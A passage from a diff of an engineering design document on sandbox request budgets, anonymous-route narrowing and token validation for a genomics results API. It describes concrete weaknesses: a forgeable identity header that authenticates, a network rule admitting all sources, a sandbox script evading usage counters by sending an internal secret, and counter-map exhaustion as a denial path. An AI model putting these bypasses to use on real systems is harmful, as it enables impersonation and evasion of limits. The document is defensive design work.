-earlier draft exempted error responses on the grounds that "an error body is small"; that is
-false, because FastAPI's own 422 handler *echoes the offending input* — measured, a 100 000-char
-query parameter produced a 100 144-byte error body, and a 200 014-byte body was delivered under
-a 500-byte cap with `bytes_sent` left at 0. Uncharged, uncapped error bodies made the real egress
-bound `SANDBOX_MAX_REQUESTS_PER_EXECUTION` × (whatever fits in a URI or a request body) rather
-than the 1 GiB budget. What the status still changes is only the *rejection*: an over-cap 2xx
-becomes a 429, while an over-cap non-2xx keeps its own status and gets the same bounded stub
-body, because rewriting a 404 into a 429 loses the real answer and invites a retry that can only
-404 again. One body remains uncharged — a response *rejected* over the 16 MiB cap, whose bytes
-never went on the wire; a loop of those is what the request-count limit bounds, and each still
-consumes a request slot.
-
-*Cleanup cannot evict a live execution.* db-api trims `_jti_bytes` LRU at 1024 entries, which can
-drop a running execution's counter and silently reset its budget: the fail-open direction. Here
-an entry is evictable only once its token has passed the point where `verify_sandbox_token` would
-still accept it (`exp` plus the verifier's leeway, so no further request can present that `jti`)
-**and** it has nothing in flight — the second condition covering a stream that outlives its own
-token. The map is still hard-bounded at `SANDBOX_MAX_TRACKED_EXECUTIONS` (4096, swept lazily when
-a new `jti` arrives), but at the bound it is the *new* execution that is refused, never a running
-one that is evicted. At the measured peak of 23 chat turns/hour the bound is a backstop rather
-than a working limit. The **deadline** above is the counterpart the anti-eviction rule previously
-lacked: it bounds how long an entry can stay unevictable at `SANDBOX_REQUEST_TIMEOUT_SECONDS`
-rather than at the life of the socket.
-
-*"Entries live at most one token lifetime (~305 s)" is the **minter's** invariant, not the
-verifier's,* and earlier drafts of this section stated it as though results-api enforced it.
-`_Execution.expires_at` is the token's `exp` taken verbatim, and `verify_sandbox_token` bounds
-`iat` in the past (`>= now - 300`) while putting **no ceiling on `exp - now`** — so a token minted
-with a far-future `exp` produces an entry the sweep will not touch for as long as that `exp`
-says. It holds because chat-backend is the only minter and mints 300 s tokens. A ceiling would
-belong in `app/core/sandbox_token.py` (and db-api's `api/sandbox_auth.py`), next to the `iat`
-check; none is asserted today.
-
-*`replicas: 1` is load-bearing here too.* The counters are in-process, so N replicas give one
-execution N × every limit above — and N × the pod-wide concurrency bound that exists to protect
-this pod's 8Gi against buffered response bodies. `k8s/deployments/results-api.yaml` carries a
-comment on `replicas: 1` saying so, matching db-api's.
-
-*Operator-tunable in fact, not only in principle.* All seven env vars are declared at their
-defaults in `k8s/deployments/results-api.yaml`, so tuning one is an edit and a rollout rather
-than a rebuild. They were code-default-only in the first draft, which made "env-configurable"
-true of the code and false in practice. Each is a ceiling compared with `>=`, so a value below 1
-would silently mean "reject every sandbox request" — results-api therefore refuses to start on
-one, and on `SANDBOX_MAX_CONCURRENT_REQUESTS_TOTAL < SANDBOX_MAX_CONCURRENT_REQUESTS`, and on a
-`SANDBOX_RESERVED_POD_SLOTS` larger than the headroom between those two, rather
-than failing at the first request where no health check would attribute it to a typo.
-
-**Two limitations, stated because as shipped these controls bound less than the rest of this
-section implies.**
-
-1. *They only bind a request that volunteers a token — and the thing that makes that sufficient
-   is not in this section.* `_sandbox_principal` reads the `Authorization` header off the ASGI
-   scope; with no header it returns `None` and `admit` is never called, so the request is
-   counted against **nothing**: no aggregate byte budget, no request count, no concurrency slot.
-   Until `genetics-results-suite-0lf` that was an open hole: results-api answered 200 with no
-   credential on seven `@is_public` routes (`/api/v1`, `/healthz`, `/api/v1/auth`,
-   `/api/v1/variant_sets`, `/api/v1/variant_sets/{name}`, and `/api/v1/rsid/variants` GET and
-   POST — re-derive with `grep -rn "@is_public" app/`, or read the live route table with
-   `app.dependencies.public_route_paths`), the sandbox's NetworkPolicy egress reaches
-   `results-api:4000` **directly**, bypassing auth-gateway, and 20 of 20 header-less requests
-   were measured served 200 with the counter map still empty.
-
-   **Partially closed — the no-credential path only — by shrinking the anonymous surface rather
-   than by identifying the caller.** With `ANONYMOUS_SURFACE_MINIMAL` on,
-   `app.dependencies.is_public_endpoint` treats only `ALWAYS_ANONYMOUS_PATHS` — today `/healthz`
-   alone — as servable with no principal. Every other route answers 401 to a request carrying no
-   credential.
-
-   **That control is its own flag, and it defaults to on** (`genetics-results-suite-rhh`). It
-   was keyed directly on `SANDBOX_ENABLED` in the first draft, which made the incident lever and
-   the security lever the same switch with the security side failing **open**: turning the
-   sandbox off during an incident — the routine action, and one whose variable name advertises
-   nothing about the anonymous surface — silently re-opened all six routes. `SANDBOX_ENABLED`
-   now only *forces* the minimal surface, so the sandbox can never run with the wide one, while
-   `ANONYMOUS_SURFACE_MINIMAL=false` is an explicit, sandbox-overridable widening. The parse is
-   inverted relative to every other boolean in `app/config/common.py` — unset is **on**, only an
-   explicit false-y value turns it off — so a typo fails safe.
-
-   *Defaulting it on changes behaviour at the next deploy rather than at sandbox rollout, and
-   that is deliberate.* The argument never depended on the sandbox existing. Most in-cluster
-   callers admitted to `results-api:4000` by `k8s/network-policies/policies.yaml` already present
-   a credential — auth-gateway's `@api_bearer` forwards the client's own bearer, chat-backend and
-   mcp-server send `INTERNAL_API_SECRET` from their Deployments, the monitor CronJob
-   authenticates and its only other results-api route was never `@is_public`, and the kubelet
-   reaches `/healthz`, which stays anonymous.
-
-   **Two callers do not, and the browser is one of them — this is a three-service ordering
-   constraint, `bff` → `mcp-server` → `results-api`, and nothing enforces it.**
-
-   1. *The browser.* The BFF attaches the shared secret only on its **typed** upstream routes
-      (`bff/upstream.ts`). All six routes this narrows are reached through the BFF's **generic
-      passthrough** (`bff/passthrough.ts`), which attaches nothing. Measured against the live
-      cluster: a header-less request through the **deployed** BFF gets **200** from
-      `/api/v1/auth`. The passthrough change that adds `Authorization` exists only in
-      genetics-results-browser's un-deployed `db-only-architecture` worktree. Deploying
-      results-api first therefore 401s the browser on its login-state probe (`/api/v1/auth`),
-      on `/api/v1/variant_sets` and `/api/v1/variant_sets/{name}`, and on `/api/v1/rsid/variants`.
-      Ship that BFF build first.
-   2. *An mcp-server pod with `INTERNAL_API_SECRET` unset*, whose tool executor's header build
-      fell back to sending nothing at all; `genetics-results-suite-618` made that a startup
-      failure. Be precise about what shipping 618 first buys: **not** a working pod. It converts
-      a bare, unexplained 401 on every tool call into a CrashLoopBackOff naming the variable.
-      Diagnosability, not availability.
-
-   `scripts/rollout.sh`'s `ORDERING:` header carries the sequence. `scripts/deploy.sh` restarts
-   every Deployment in one loop with no waiting and with results-api ahead of chat-backend and
-   mcp-server — i.e. it actively does the adverse order — and now says so next to its `DEPLOYS`
-   list. Neither is a guard.
-
-   *What 618 actually does, since "assert it in the executor" would have been wrong.*
-   `config/settings.py:require_internal_api_secret()` raises with a message naming the variable,
-   and the two **deployed entrypoints** call it: `mcp_server.main()` on the remote transports,
-   beside the existing `MCP_API_KEY` refusal, and `chat_api`'s lifespan when `REQUIRE_AUTH` is
-   true. It is deliberately not enforced at import, in `Settings`, or in `ToolExecutor.__init__`,
-   because two legitimate callers hold no secret: a local run against an unauthenticated
-   results-api (the README documents the variable as optional), and **the sandbox image, which
-   holds no internal credential by design** — `_PrunedInstallSettings` ships the SDK's import
-   closure without `config/settings.py` and the sandbox gets a per-execution token instead
-   (`4h6.9`/`4h6.44`). A full install that builds the client with no secret logs a warning naming
-   the variable, which is the only local signal a developer gets. Note that **only
-   `k8s/deployments/mcp-server.yaml` marks the `internal-api-secret` `secretKeyRef`
-   `optional: true`** — that is exactly how the variable ends up unset with the pod still
-   starting, and mcp-server is therefore the only one of the two that can reach the silently
-   anonymous state the guard exists to catch. `k8s/deployments/chat-backend.yaml` sets no
-   `optional` on that key, so a missing key there never starts the container at all: it is a
-   `CreateContainerConfigError` on the pod, not an unset variable inside a running process. Both
-   still call the guard, because an *empty* value satisfies the kubelet and reaches the process
-   in either Deployment. results-api still cannot tell a sandbox request from a browser request — both
-   arrive on `:4000` in-cluster — and for this half it does not have to.
-
-   **What is emphatically not true is that "the only way into a handler is to present a
-   credential, and presenting the sandbox's is what calls `admit`."** Earlier drafts of this
-   section, and of both module docstrings, said exactly that. `admit` is reached only from
-   `_sandbox_principal`, which accepts an **HS256 sandbox token and nothing else**.
-   `INTERNAL_API_SECRET` satisfies `is_internal_caller`, so `get_verified_user` resolves
-   `mcp-tool` and the request enters the handler with **`admit` never called**. Measured, driving
-   the real ASGI app with `SANDBOX_ENABLED=true` and `REQUIRE_AUTH=true` and
-   `Authorization: Bearer $INTERNAL_API_SECRET`:
-
-   | request | result | `sandbox_budget._executions` after |
-   |---|---|---|
-   | `GET /api/v1/rsid/variants` | 200, `user_email=mcp-tool` | `{}` |
-   | `GET /api/v1/variant_sets` | 200, `user_email=mcp-tool` | `{}` |
-
-   This was not hypothetical, and it is the reason the transport had to change. While
-   `sdk/client.py` authenticated with `INTERNAL_API_SECRET`, a sandbox script shed all four
-   counters by sending the internal secret **instead of** sending no header — the fix to the
-   no-credential half converted "omit the header" into "send the other header".
-
-   **The sandbox's half of that residue is now closed, in the transport rather than in
-   results-api's request code.** `genetics-results-suite-4h6.44` has landed: the SDK builds its
-   client from the per-execution tokens when `SANDBOX_TOKEN_FILE` names them, attaches the
-   audience-bound token for each destination, and **never attaches `INTERNAL_API_SECRET`
-   alongside or instead** — the two paths are mutually exclusive in `_build_client`, precisely
-   because attaching both, or preferring the secret, would silently re-open this. A missing or
-   unusable token file raises rather than falling back. `genetics-results-suite-4h6.7` keeps the
-   Deployment half: the sandbox is never given the secret in the first place.
-
-   **What remains is intentional and is not the sandbox's.** results-api still serves an
-   internal-secret caller with no accounting, because chat-backend, mcp-server and bff
-   legitimately authenticate that way and none of them is a per-execution tenant.
-   `tests/test_anonymous_surface.py::test_the_internal_secret_path_survives_but_the_sdk_no_longer_takes_it`
-   pins **both** halves as current behaviour: the internal-secret path is still served
-   unaccounted, and the SDK no longer takes it. It replaces the earlier
-   `test_an_internal_secret_caller_is_served_but_not_accounted`, which recorded the residue as
-   something expected to fail once `4h6.44` landed — the residue did not go away, the *caller*
-   did.
-   The invariant `app/core/limits.py` states — that omitting the header cannot buy a *looser*
-   limit — held for the per-response byte cap only; for these four counters, omitting it would
-   buy **no** limit, which is why the anonymous surface has to be *empty* rather than merely
-   capped. Both module docstrings now say the partial version.
-   Still deliberately **not** done: no rate limiter and no anonymous-traffic
-   bucket. (A **request** timeout now exists — `SANDBOX_REQUEST_TIMEOUT_SECONDS`, above — but it
-   is armed off the execution token, so it bounds none of the traffic this limitation is about.) `/healthz` remains anonymous by necessity (the kubelet holds no credential and its
-   probes bypass NetworkPolicy) and its request rate is unbounded; its handler is a constant
-   document on no data path, so that residue is `genetics-results-suite-8zk`'s, not a
-   per-execution budget any counter here can hold.
-2. *`sandbox_execution_tracker_full` is a cross-tenant denial surface; the pod-wide concurrency
-   limit no longer is.* Both are pod-wide, so a caller that fills the counter map or holds the
-   pod-wide slots locks *other* executions out; neither was merely a self-limit. The "23 chat
-   turns/hour" sizing above is an argument about honest volume and says nothing about an
-   attacker. Limitation 1's sandbox half is now closed —
-   the SDK sends the per-execution token and nothing else (`4h6.44`) — but the counters were
-   never a fairness mechanism, and the intentional internal-secret residue means an
-   internal-secret caller inside the namespace still reaches these pod-wide surfaces without
-   being accounted.
-
-   The concurrency half is closed by `SANDBOX_RESERVED_POD_SLOTS` (above,
-   `genetics-results-suite-yv4`), with the bounded guarantee stated there. **The tracker bound
-   is not, and the choice is deliberate rather than pending.** The obvious alternative — at a
-   full map, shed the oldest *idle* entry instead of refusing the newcomer — moves the harm from
-   the innocent newcomer to an incumbent, and that trade is worse than it looks: an idle entry is
-   not a finished one. `_sweep_locked` already drops every entry whose token can no longer
-   authenticate, so a map that is full is full of executions that **can** still present their
-   `jti`, and a shed entry returns with `requests`, `bytes_sent` and `in_flight` reset to zero.
-   Shedding-oldest therefore converts a bounded, visible, `429`-with-a-code denial of the
-   newcomer into a silent reset of an incumbent's aggregate budget — the fail-open direction, the
-   exact failure this map is not db-api's LRU in order to avoid — and an attacker who can fill
-   the map can then also mint a fresh `jti` per request to shed its own accounting on demand. It
-   is sized far above honest use precisely so an honest execution never meets it, entries live no
-   longer than the `exp` their minter chose (see above — that is chat-backend's invariant, not one
-   this service enforces), the deadline now bounds how long any one of them can stay unevictable, and it fails toward refusing new work rather than corrupting a running
-   execution's accounting.
-
-Production impact is no longer hypothetical: staging has run the sandbox under gVisor since
-2026-08-26 and `k8s/deployments/results-api.yaml` sets `SANDBOX_ENABLED: "true"`, so these
-counters bind live traffic there. `tests/test_sandbox_budget.py` (44 tests, offline lane) is
-still the only thing that will report a regression in the accounting itself. **The anonymous surface is the
-exception and is live now**, since `ANONYMOUS_SURFACE_MINIMAL` defaults to on: six routes that
-answered anonymous callers stop doing so at the next results-api deploy (see the ordering
-constraint on `genetics-results-suite-618` above).
-
-**The departure: `@is_public` routes are relaxed, not tight — and the measurement that
-decided it.** Read literally, "no credential gets the tight limits" would apply the sandbox
-caps to results-api's `@is_public` routes, because `auth_required` returns before
-`get_verified_user` and no principal is resolved there at all. Re-derive that set with
-`grep -rn "@is_public" app/` rather than trusting a count here — today it is **seven**:
-`/api/v1/auth`, `/api/v1/variant_sets`, `/api/v1/variant_sets/{name}`, `/api/v1/rsid/variants`
-GET and POST, and — missed by earlier drafts of this section, which said five — `/api/v1` and
-`/healthz` (`app/server.py`), each of which returns a fixed handful of bytes.
-Those routes are the browser's, reached through bff (`bff/inputParse.ts:81` and `:215`).
-
-The first question was whether tight caps there would truncate or 429 a real browser request.
-Measured, they would not, and the numbers are worth recording because they are the reason this
-is a judgement call rather than a forced one:
-
-| public route | production calls, `timestamp >= "2026-07-13" AND timestamp < "2026-08-12"` | largest response possible | vs the 16 MiB cap |
-|---|---|---|---|
-| `GET /api/v1/rsid/variants` | 64 | ~700–1 300 rows, bounded by URL length (nginx `large_client_header_buffers` 8k, h11's 16 KiB) rather than by code | <1% |
-| `POST /api/v1/rsid/variants` | 0 (never seen in production) | was **unbounded in code**; now 5 000 ids (`app/routers/rsid.py` `MAX_RSIDS`), enforced for every caller | <1% |
-| `GET /api/v1/variant_sets/{name}` | 3 | 888 rows / 18.6 KB (`FinnGen_enriched_202505`, the largest configured file) | 0.1% |
-| `GET /api/v1/variant_sets` | 0 (never seen in production) | 3 rows / 74 B | — |
-| `GET /api/v1/auth` | 0 (1 hit ever, 2026-03-07) | 1 object / ~90 B | — |
-| `GET /api/v1` | 0 (4 hits ever, last 2026-05-20) | a fixed object of a few hundred bytes | — |
-| `GET /healthz` | unmeasurable — excluded from usage logging by design | a fixed object of a few hundred bytes | — |
-
-**Where these numbers come from, so they can be re-run.** `phewas-development.genetics_api_logs.stdout`
-— the GKE production table — over the **fixed window `[2026-07-13 00:00 UTC, 2026-08-12 00:00 UTC)`**;
-the "ever" figures are the same table unbounded (it starts 2026-03-06). The bounds are **literal
-on purpose**: an earlier draft printed `TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 30 DAY)` while
-labelling the window as calendar dates, so the query drifted a day per day away from the numbers
-beside it and re-running it produced a different table every time (55 rather than 64 on the top
-row, the whole of the disagreement). Re-run this query verbatim and you get the table above; change
-the bounds and you are measuring something else, so change the counts with them. Query:
-
-```sql
-SELECT jsonPayload.http_method, jsonPayload.endpoint_path, COUNT(*) AS n, MAX(timestamp) AS last_hit
-FROM `phewas-development.genetics_api_logs.stdout`
-WHERE timestamp >= "2026-07-13" AND timestamp < "2026-08-12"
-  AND jsonPayload.log_type = "endpoint_access"
-GROUP BY 1, 2 ORDER BY n DESC
-```
-
-Add `AND jsonPayload.service = "results-api"` to exclude db-api's rows, which land in this same
-table — but only for rows written on or after 2026-08-12; before that, see the three eras under
-`docs/project-spec.md` → "Log sinks". Do **not** filter on
-`jsonPayload.log_source = 'genetics-results-api-prod'`: results-api renamed
-that value to `finngenie_prod` on 2026-06-03, so the old value returns nothing after that date and
-no error — which is exactly why `service` exists and `log_source` is not the discriminator. Do
-**not** query `genetics_api_logs.genetics_results_api`, which earlier drafts of this
-table used — despite its name it is not the production service (see below).
-
-An earlier draft's row asserting "`GET /api/v1`, `GET /healthz` — not in the sink" was wrong for
-one and right for the other, for different reasons. `/api/v1` **is** logged; it simply gets
-almost no traffic (4 hits in the table's whole history). `/healthz` is genuinely absent, but by
-design rather than by disuse: it is in `usage_logging_excluded_paths`
-(`app/config/common.py`, alongside `/api/v1/docs`, `/api/v1/redoc`, `/api/v1/openapi.json`,
-`/favicon.ico`), so no volume of kubelet probes would ever appear. Its call count is therefore
-not measurable from this sink at all — but it returns a fixed object either way, so nothing in
-the argument turns on it.
-
-The remaining zeroes are real and unsurprising: these public routes are the browser's, and the
-browser is a small share of a service whose traffic is dominated by `mcp-tool` calls to
-authenticated routes.
-
-Sizes are measured from the GCS variant-set files and from auth-gateway's `$body_bytes_sent`
-(external traffic only — bff and mcp-server reach results-api in-cluster and bypass the
-gateway, so **no response size is logged for the dominant caller**). The middleware emitted a
-`jsonPayload`-only record for every row in the measured window, so `httpRequest.responseSize` is
-structurally NULL across all of them — there is no response-size data in it for that period — and
-`full_path`, which would reveal rsid counts, is stripped before Cloud Logging. Rows written from
-2026-08-27 carry a size (`app/middleware_usage_logging.py` emits `response_body_bytes`), but it is
-**not commensurate with `$body_bytes_sent` and cannot be substituted into this table**: it counts
-uncompressed body bytes excluding headers — the usage middleware sits inside `GZipMiddleware` —
-while the gateway counts compressed wire bytes, and for these TSV endpoints the two differ by
-roughly an order of magnitude. Mixing them is exactly the apples-to-oranges comparison this caveat
-exists to prevent; a re-measurement from those rows has to re-derive the whole table in body-byte
-terms rather than swap one column for the other. **Nothing in this analysis is re-derived from
-those rows** — it still rests on the GCS file sizes and the gateway's `$body_bytes_sent`.
-
-*What this table cannot show, and why an earlier draft got it wrong.* An earlier draft sourced
-these counts from `phewas-development.genetics_api_logs.genetics_results_api` and added
-"`user_email` is NULL on every one of these rows, confirming no principal is resolved". **Both
-the counts and that inference are withdrawn.** The reason is not a sink artifact, a lag, or
-anything about principals: **that table is a different machine's log.** A BigQuery log sink names
-its table after the *log ID*, not after the service, so the table carrying the service's name is
-the decoy — it is fed by the `genetics-results-api-dev1` GCE VM running the results-api **test
-suite** (`sourceLocation.file` points inside a developer checkout; 1,638 entries within a single
-second), while the production GKE rows are in `stdout`. Every number in the old table therefore
-measured a developer's tests, and its all-NULL `user_email` was a property of test traffic, not
-of production principals. See `docs/project-spec.md` → "Log sinks" for the full account. The
-table above is re-measured against `stdout`; sizes are still not available from any sink, so the
-no-truncation conclusion below rests — as it already did — on the caps being unreachable by the
-largest response this code can produce, not on logged size data.
-
-So capping them would not regress anything today. They are nonetheless **relaxed**, because the
-exception costs nothing and the alternative does not: these routes already answer the open
-internet with no credential and bill no BigQuery, so tight caps would constrain only *anonymous*
-browser traffic, while carrying a real regression risk if a curated variant set is ever
-configured with more than 25 000 variants. `REQUIRE_AUTH=false` (local development; the shipped
-`results-api.yaml` sets `"true"`) is relaxed for the same reason.
-
-**And with the minimal anonymous surface the exception has nothing left to apply to.**
-Everything above is the wide-surface shape — the behaviour that predates the sandbox, and the
-reason the relaxation is still described rather than deleted; it now requires an explicit
-`ANONYMOUS_SURFACE_MINIMAL=false`. With that flag at its default (or forced by
-`SANDBOX_ENABLED`), `is_public_endpoint` answers true for `/healthz` only, so six of the seven
-routes stop being anonymous and get whatever their caller's principal earns them: relaxed for the BFF's shared secret and for a verified user,
-tight for a sandbox token. The table above is what says this costs the browser nothing —
-64 + 3 + 0 + 0 + 0 calls in a month.
-
-*How those calls arrived is an architectural claim, not a measured one, and an earlier draft
-overstated it.* That draft said "every one of them arriving through `auth_request /oauth2/auth`
-and then the BFF". **The usage log cannot show that, by construction, on precisely these seven
-routes.** `middleware_usage_logging` attributes a caller two ways: the internal secret plus an
-allow-listed `X-Goog-Authenticated-User-Email`, or a fallback that reads
-`request.state.authenticated_user`. On an `@is_public` route that state is **never set** —
-`auth_required` returns at `is_public_endpoint` before `get_verified_user` runs — so the fallback
-is dead there, and a caller presenting the internal secret logs *identically* to one presenting
-nothing. Measured: `user_email` is NULL on 246 of 246 rows for the rsid route over 90 days, which
-distinguishes nothing.
-
-The guarantee is therefore **architectural**: `k8s/deployments/auth-gateway.yaml` routes every
-browser `/api/` request through `auth_request /oauth2/auth` to the BFF, which attaches the shared
-secret as its own `Authorization: Bearer` on the upstream call (`bff/upstream.ts`; the paths are
-`bff/inputParse.ts:81` and `:215`), and a programmatic client reaches the same routes through
-auth-gateway's `@api_bearer` with its own bearer. Nothing entering the cluster from outside can be
-anonymous at results-api. **No production caller of these routes is anonymous at results-api** is
-a statement about the ingress paths that exist, not an observation from the logs, and it is what
-makes requiring a principal free rather than a trade-off.
-
-*The three alternatives that were rejected, because each looks reasonable until it is checked.*
-
-- **Require the *sandbox* token on all routes.** Cannot be written: results-api sees a browser
-  request and a sandbox request identically on `:4000`, and `/healthz` is probed by the kubelet,
-  which holds no credential at all. Requiring *a* principal instead sidesteps the whole
-  identification problem, which is why that is what shipped.
-- **Take `results-api:4000` off the sandbox's egress allow-list** and force its traffic down a
-  path that always carries the token. This was the preferred option when the work was filed, on
-  the premise that "the sandbox has no reason to call an unauthenticated route". **The premise is
-  false.** `GeneticsClient.search(rsids=...)` calls `ToolExecutor.lookup_variants_by_rsid`, which
-  issues `GET {results-api}/v1/rsid/variants` — one of the seven. And the census in
-  `genetics-results-suite-6uk` puts 16 of the SDK's 25 public functions on results-api alone with
-  5 more branching to it, so the allow-list entry is load-bearing for most of the SDK, not just
-  for that one call. There is also no path with the property the option asks for: the sandbox is
-  denied auth-gateway by design (section 3), and auth-gateway would not validate a sandbox HS256
-  token anyway. A dedicated results-api port would give a discriminator NetworkPolicy can
-  enforce — egress evaluates the destination **pod** port on this dataplane, so it would take a
-  second listening socket in results-api, not a second Service port — and that remains available
-  if a future control needs to distinguish the sandbox at the transport layer. It was not needed
-  to close this hole.
-- **A pod-wide bound on anonymous requests.** Caller-agnostic, but it is a rate limiter by
-  another name (`genetics-results-suite-8zk`), and set low enough to matter it answers 429 to
-  browser traffic on routes the browser owns. Removing the anonymous surface removes the thing
-  the bucket would have had to meter.
-
-*Enforcement, since the control is two booleans in one function.* `results-api`
-`tests/test_anonymous_surface.py` (12 tests, offline lane) reads the **live route table** and
-pins the anonymous surface in both states: a new `@is_public` decorator fails
-`test_the_public_route_set_is_what_the_docs_claim`, and one that also survives the minimal
-surface fails `test_the_minimal_anonymous_surface_is_exactly_healthz`. Three further tests pin
-the flag itself — that an empty environment yields the minimal surface and a typo does not widen
-it, that `SANDBOX_ENABLED` forces it over an explicit `false`, and that turning the sandbox off
-does **not** re-open the surface, which is the regression `genetics-results-suite-rhh` was.
-That test asserts against the **literal** `{"/healthz"}` on both sides; an earlier version
-compared the computed surface to `ALWAYS_ANONYMOUS_PATHS` itself, which is tautological — adding
-`/api/v1`, `/api/v1/auth` and `/api/v1/variant_sets` to the constant left all 8 tests passing.
-Re-run against the fixed suite that same widening fails 2 tests. The route set is derived, never
-listed, so it cannot rot the way a count in prose does.
-`scripts/test-network-policies.py` cannot help here — it reads manifests and has no view of a
-Python decorator — which is precisely why the assertion lives with the routes.
-What these tests do **not** pin is accounting: only
-`test_the_internal_secret_path_survives_but_the_sdk_no_longer_takes_it` drives a request; the
-rest check a boolean predicate, which is exactly why the `INTERNAL_API_SECRET` bypass above was
-invisible to the suite until it was measured by hand.
-
-*A rollout coupling this created, and it was never the one the earliest draft described.* That
-draft said flipping `SANDBOX_ENABLED` to `"true"` before `4h6.44` landed would make "every SDK
-call 401". **Measured false at the time**: the SDK authenticated with `INTERNAL_API_SECRET`
-read from the environment, that secret satisfies `is_internal_caller`, and driving the real
-ASGI app with `SANDBOX_ENABLED=true` and `REQUIRE_AUTH=true` returned **200** on
-`/api/v1/rsid/variants` and `/api/v1/variant_sets` as `user_email=mcp-tool`. The real hazard was
-the opposite and worse: the SDK kept working while contributing nothing to the per-execution
-budget, so the flip *looked* successful — no 401s, nothing in the logs to notice — while the
-control it was supposed to activate stayed inert.
-
-**`4h6.44` has landed and that hazard is gone**, along with the reasoning that produced it. The
-SDK now builds its client from the per-execution tokens, so a sandbox request resolves a
-principal, `admit` runs, and the counters are no longer empty. Two things this does **not**
-change, both easy to over-read:
-
-- The SDK does not 401 for a *missing* token either — it **raises before the request**, because
-  `SANDBOX_TOKEN_FILE` being set with an unusable file is a misconfiguration, not a caller to
-  degrade. Neither the old 401 story nor a silent-fallback story describes the current
-  behaviour.
-- `SANDBOX_ENABLED` still does not close "send the internal secret instead" *at results-api* —
-  it never could, since that path serves chat-backend, mcp-server and bff. What closed it for
-  the sandbox is that the sandbox no longer holds the secret (`4h6.7`) and the SDK no longer
-  sends it (`4h6.44`).
-
-**The commit that lands the sandbox workload and flips the flag still has to carry the
-Deployment half (`4h6.7`)**, for the same reason as before: a sandbox pod holding
-`INTERNAL_API_SECRET` re-opens the bypass regardless of what the SDK prefers, because a script
-that can read `os.environ` can build its own client. This is the same commit
-`genetics-results-suite-r22` already couples the label contract and the flag to; the
-requirement is additive, not a new one.
-
-**Why the exception has zero security delta — and the premise that had to be made true first.**
-The earlier argument was that a sandbox script is capped on these routes either way, so relaxing
-them changes nothing for it. That was half the story, and the missing half was a live break of
-the invariant. On `POST /api/v1/rsid/variants`, `parse_and_validate_rsids` validated format and
-never counted, and the handler read the body with an unbounded `await request.body()`. So a
-script **presenting** its sandbox token got 25 000 rows / 16 MiB, while the same script
-**omitting** the header got an unbounded response fully materialized in the pod — the absent
-credential buying a strictly looser cap than the sandbox credential, which is exactly what this
-section forbids. `k8s/network-policies/sandbox-policy.yaml` admits the sandbox to
-results-api:4000 directly, bypassing auth-gateway, so its `client_max_body_size` never saw that
-body either.
-
-What makes the exception safe is therefore not the cap but that every public route bounds its
-own response **for every caller**. `parse_and_validate_rsids` now rejects more than `MAX_RSIDS`
-ids with a 422 and the POST bounds its body read as it streams, both with **no sandbox special
-case** — a sandbox-only bound would leave the looser path open to the caller that simply
-declines to identify itself, so the uniformity is what makes the invariant hold. `MAX_RSIDS` is
-5 000, taken from the GET's own incidental ceiling: h11 caps the request line plus headers at
-16 KiB and the shortest possible id costs 4 bytes in the query string ("rs1,"), so no GET that
-works today can carry more than 4 096 ids. 5 000 therefore regresses nothing that currently
-succeeds, while bounding the POST to a response of a few hundred KB. No bulk POST caller exists
-today.
-
-The other half of the change still holds and still matters: the sandbox principal is resolved in
-`auth_required` **before** both short circuits, so a sandbox token is capped on a public route
-and under `REQUIRE_AUTH=false` as well. It is not sufficient on its own, because it only
-tightens the caller that chose to identify itself — which is why the invariant rests on the
-uniform bound above. The invariant the section
-above is really asserting — *a caller must never obtain looser limits by presenting a weaker
-credential* — is preserved: a sandbox token is capped everywhere it is presented, and dropping
-a verified credential on a route that requires one yields a 401, not a wider cap. What is
-relaxed is the absence of a credential on a route that asks for none.
-
-### results-api: weaker auth than db-api, and a bypass that must close first
-
-Section 4 above works through db-api's `require_auth`. **results-api's authentication is a
-different and weaker code path, and `4h6.9` must not assume the db-api reasoning transfers.**
-Three specifics, all verified against the source:
-
-1. **A forged identity header authenticates.** `genetics-results-api/app/core/auth.py`
-   `get_verified_user()` calls `get_bearer_token_user()`, and when that returns `None` —
-   which is what happens when there is **no `Authorization` header at all** — it falls
-   through to `get_authenticated_user()`, which reads `X-Goog-Authenticated-User-Email` and
-   splits it on `":"`. There is no proof of origin on that header. Anything that can reach
-   results-api can name itself any user.
-2. **Anything in the namespace can reach results-api.**
-   `k8s/network-policies/policies.yaml` `allow-ingress-results-api` contains a rule with
-   `- ports: - port: 4000` and **no `from:`**, which admits all sources. auth-gateway does
-   handle the identity header correctly *at the edge*, but nothing forces traffic through
-   auth-gateway, so any pod in the namespace bypasses it.
-3. **Rule 2 of the db-api list is unimplementable here as written.**
-   `get_bearer_token_user` runs `hmac.compare_digest` against the shared secret **first**,
-   and only then routes on `"." in token`. A sandbox HS256 JWT contains dots, so if the
-   sandbox validator is inserted after the dot check — or is allowed to fall through on
-   failure — the token continues into `id_token.verify_oauth2_token`, where
-   `GOOGLE_TOKEN_AUDIENCE` is unset in `k8s/deployments/results-api.yaml` and the code logs
-   a warning and continues.
-4. **And the dot test cannot be the discriminator, because results-api has another JWT
-   caller.** Google Identity Tokens are three-segment JWTs too, and they are handled today
-   at exactly that `if "." in token` branch. A rule of "JWT-shaped bearer → sandbox
-   validator, hard 401 on failure, never a fallthrough" would therefore reject **every
-   Google Identity Token results-api serves**. (The no-dots user-API-token path survives;
-   the Google path does not.) This is the same correction as db-api rule 1, and here it is
-   not latent — it is immediately fatal.
-
-**Specification for `4h6.9` on the results-api side:**
-
-- **Discriminate on the JOSE header.** Base64url-decode the first segment unverified, read
-  `alg`, and treat the bearer as sandbox-shaped only when `alg == "HS256"` (optionally also
-  requiring `iss == "chat-backend"`). RS256 bearers continue to `verify_oauth2_token`
-  exactly as today; dotless bearers continue to the user-API-token path exactly as today.
-  Safe for the same reason as db-api rule 1: the untrusted header only *selects* a
-  validator, and each validator pins its own algorithm independently (`algorithms=["HS256"]`
-  with the signing key, versus Google's RS256 certificates), so a forged `alg` changes only
-  which validator rejects the token.
-- Insert the sandbox validator **before** the `hmac.compare_digest` shared-secret
-  comparison, not after it and not after the dot check. A sandbox-shaped bearer must never
-  be compared against the shared secret, and must never reach `verify_oauth2_token`.
-- Sandbox-validator failure is a **hard `401`**. Never a fallthrough to another auth path,
-  never a warning-and-continue. This is the same fail-closed requirement as db-api rule 2,
-  restated because the ordering in this file makes it easy to get wrong. It applies to
-  HS256 bearers **only** — a non-HS256 bearer was never a sandbox token and its handling is
-  unchanged.
-- results-api carries its **own** row and response-size caps for the sandbox audience, on
-  the same defaults-not-penalty basis as db-api above — with results-api's broader relax
